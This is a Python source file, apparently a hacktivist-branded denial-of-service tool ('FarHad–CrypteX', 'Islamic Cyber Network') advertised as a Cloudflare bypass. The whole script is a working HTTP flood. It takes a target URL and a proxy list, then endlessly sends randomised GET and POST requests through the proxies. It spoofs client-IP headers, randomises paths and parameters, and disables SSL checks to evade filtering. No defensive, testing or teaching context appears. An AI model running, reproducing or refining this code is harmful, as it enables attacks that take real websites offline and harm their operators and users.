import asyncio
import aiohttp
import random
import string
import time
from colorama import Fore, init

init(autoreset=True)

import os
os.system('clear')

print(Fore.CYAN + '''
< Islamic Cyber Network >
      !!!!!!!
     ^~~!!!~~^
    ^$$$nWxl!         <!!IUW$$$^
   $$$$$#MWX!        $$$$$$$$$$
 ^$$$$$b  $$$UX      $$$$$$$$$$
 ^$$$b    $$$$^      d$$R   d$$R
   *$bd$$$*          $$$$so~#

███████╗ █████╗ ██████╗ ██╗  ██╗ █████╗ ██████╗     
██╔════╝██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██╔══██╗    
█████╗  ███████║██████╔╝█████╔╝ ███████║██║  ██║    
██╔══╝  ██╔══██║██╔═══╝ ██╔═██╗ ██╔══██║██║  ██║    
██║     ██║  ██║██║     ██║  ██╗██║  ██║██████╔╝    
╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     

   FarHad–CrypteX  |  Cloudflare Bypass Edition
''')

print(Fore.YELLOW + "FARHAD CRYPTEX - ULTIMATE FLOOD TOOL v4.0 (Cloudflare Bypass)\n")

url = input("Enter target URL (without trailing /): ")
threads = int(input("Enter number of concurrent tasks: "))
proxy_file = input("Enter proxy list file (one per line, e.g., 123.123.123.123:8080): ")

with open(proxy_file, 'r') as f:
    proxies = [line.strip() for line in f.readlines() if line.strip()]

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)"
]

custom_headers = [
    {'X-Forwarded-For': lambda: '.'.join(str(random.randint(0, 255)) for _ in range(4))},
    {'X-Real-IP': lambda: '.'.join(str(random.randint(0, 255)) for _ in range(4))},
    {'Cf-Connecting-IP': lambda: '.'.join(str(random.randint(0, 255)) for _ in range(4))}
]

success = 0
failed = 0
start_time = time.time()

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def random_path():
    return '/' + '/'.join(random_string(5) for _ in range(2))

async def attack(session, proxy):
    global success, failed
    method = random.choice(['GET', 'POST'])
    base_headers = {
        'User-Agent': random.choice(user_agents),
        'Referer': f"https://google.com/{random_string(5)}",
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9'
    }
    # Add custom anti-bot headers
    for h in custom_headers:
        for key, func in h.items():
            base_headers[key] = func()

    params = {random_string(5): random_string(8) for _ in range(3)}
    data = {random_string(5): random_string(8) for _ in range(3)}
    full_url = url + random_path()

    try:
        if method == 'GET':
            async with session.get(full_url, headers=base_headers, params=params, proxy=f'http://{proxy}', timeout=5, ssl=False) as resp:
                success += 1
                print(Fore.GREEN + f"[+] {proxy} | {method} {full_url} | Code: {resp.status}")
        else:
            async with session.post(full_url, headers=base_headers, data=data, proxy=f'http://{proxy}', timeout=5, ssl=False) as resp:
                success += 1
                print(Fore.GREEN + f"[+] {proxy} | {method} {full_url} | Code: {resp.status}")
    except Exception as e:
        failed += 1
        print(Fore.RED + f"[-] {proxy} | {method} {full_url} | Failed ({str(e)[:30]})")

async def stats():
    while True:
        await asyncio.sleep(5)
        uptime = int(time.time() - start_time)
        print(Fore.CYAN + f"[STATS] Sent: {success} | Failed: {failed} | Uptime: {uptime}s")

async def main():
    connector = aiohttp.TCPConnector(limit=threads)
    async with aiohttp.ClientSession(connector=connector) as session:
        asyncio.create_task(stats())
        while True:
            tasks = []
            for _ in range(threads):
                proxy = random.choice(proxies)
                tasks.append(attack(session, proxy))
            await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())